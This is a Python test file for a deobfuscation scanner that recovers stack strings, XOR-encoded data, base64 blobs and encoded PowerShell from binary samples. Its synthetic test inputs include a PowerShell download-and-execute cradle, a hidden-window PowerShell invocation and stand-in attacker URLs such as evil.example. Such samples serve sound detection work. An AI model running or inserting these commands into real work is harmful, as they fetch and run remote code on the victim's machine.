"""Tests for scanything.deobf. Synthetic, harmless bytes only."""
from __future__ import annotations

import base64
import random
import time

from scanything.deobf import recover, recovered_strings

NOP = b"\x90" * 8


def _stack_bytes_text(text: bytes, base_disp: int = 0x10) -> bytes:
    out = bytearray()
    for i, ch in enumerate(text):
        out += bytes([0xC6, 0x45, (base_disp + i) & 0xFF, ch]) + NOP[:2]
    return bytes(out)


def _stack_dword_text(text: bytes, base_disp: int = 0x20) -> bytes:
    padded = text + b"\x00" * (-len(text) % 4)
    out = bytearray()
    for i in range(0, len(padded), 4):
        out += bytes([0xC7, 0x45, (base_disp + i) & 0xFF]) + padded[i:i + 4] + NOP
    return bytes(out)


def _texts(items: list[dict]) -> list[str]:
    return [i["text"] for i in items]


def test_stack_string_from_byte_writes():
    data = NOP * 4 + _stack_bytes_text(b"kernel32.dll") + NOP * 8
    result = recover(data)
    assert "kernel32.dll" in _texts(result["stack_strings"])


def test_stack_string_from_dword_writes():
    data = NOP * 4 + _stack_dword_text(b"http://evil.example/x") + NOP * 8
    result = recover(data)
    assert "http://evil.example/x" in _texts(result["stack_strings"])


def test_stack_string_utf16_byte_writes():
    utf16 = "kernel32".encode("utf-16-le") + b"\x00\x00"
    data = NOP * 4 + _stack_bytes_text(utf16) + NOP * 8
    result = recover(data)
    assert "kernel32" in _texts(result["stack_strings"])


def test_xor_key_5a_payload():
    payload = b"http://evil.example/payload"
    encoded = bytes(b ^ 0x5A for b in payload)
    data = NOP * 40 + encoded + NOP * 40
    result = recover(data)
    hits = [x for x in result["xor"] if x["key"] == 0x5A]
    assert hits, result["xor"]
    assert any("http://evil.example/payload" in x["text"] for x in hits)


def test_base64_plain_text_is_kind_text():
    blob = base64.b64encode(b"powershell -nop -w hidden").decode()
    data = f"blob: {blob} end".encode()
    items = recover(data)["base64"]
    match = [i for i in items if i["text"] == "powershell -nop -w hidden"]
    assert match and match[0]["kind"] == "text"
    assert match[0]["source"] == blob[:60]


def test_base64_embedded_pe_is_kind_pe():
    blob = base64.b64encode(b"MZ" + bytes(100)).decode()
    items = recover(f"x {blob} y".encode())["base64"]
    match = [i for i in items if i["kind"] == "pe"]
    assert match and match[0]["text"] == "embedded PE, 102 bytes"


def test_base64_utf16_is_kind_utf16():
    blob = base64.b64encode("hello world from utf16".encode("utf-16-le")).decode()
    items = recover(f"x {blob} y".encode())["base64"]
    match = [i for i in items if i["kind"] == "utf16"]
    assert match and match[0]["text"] == "hello world from utf16"


def test_powershell_encoded_command_decoded():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://x')"
    blob = base64.b64encode(payload.encode("utf-16-le")).decode()
    data = f"powershell.exe -enc {blob}".encode()
    items = recover(data)["powershell"]
    assert [i["text"] for i in items] == [payload]


def test_plain_text_yields_nothing():
    data = (b"The quick brown fox jumps over the lazy dog. "
            b"This is ordinary prose with no hidden content at all.\n")
    result = recover(data)
    assert all(result[k] == [] for k in ("stack_strings", "xor", "base64", "powershell"))
    assert recovered_strings(result) == []


def test_deterministic_and_capped():
    data = NOP * 4 + _stack_bytes_text(b"kernel32.dll") + NOP * 40 + bytes(b ^ 0x5A for b in b"http://a.example/z")
    assert recover(data) == recover(data)
    capped = recover(data, max_items=1)
    assert all(len(capped[k]) <= 1 for k in capped)


def test_recovered_strings_flattens_all_lists():
    data = NOP * 4 + _stack_bytes_text(b"kernel32.dll") + NOP * 40
    flat = recovered_strings(recover(data))
    assert "kernel32.dll" in flat
    assert len(flat) == len(set(flat))


def test_two_mb_random_is_fast():
    data = random.Random(1).randbytes(2 * 1024 * 1024)
    start = time.perf_counter()
    recover(data)
    assert time.perf_counter() - start < 3.0
